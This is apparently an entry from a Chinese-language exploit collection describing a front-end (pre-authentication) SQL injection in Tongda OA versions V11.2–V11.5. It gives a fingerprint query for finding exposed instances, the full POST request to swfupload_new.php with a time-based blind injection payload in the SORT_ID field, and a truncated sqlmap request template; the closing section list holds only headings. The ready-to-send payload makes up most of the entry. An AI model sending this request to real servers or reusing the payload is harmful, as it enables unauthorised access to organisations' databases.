# 通达OAswfupload_new存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/file_folder/swfupload_new.php HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 355`　`Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2`

**请求体 / payload**
```
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"
1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"
1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"
2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"
-@`'`  AND (SELECT 3397 FROM (SELECT(SLEEP(5)))jCdN)
------------GFioQpMK0vv2--
\`\`\`\
sqlmap
POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: {hostname}
Content-Length: 355
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
------------GFioQpMK0vv2
Content-Dispo…（脚本共 975 字，完整版见原文）
```

**其他**
- 通达OA swfupload\_new存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.2-V11.5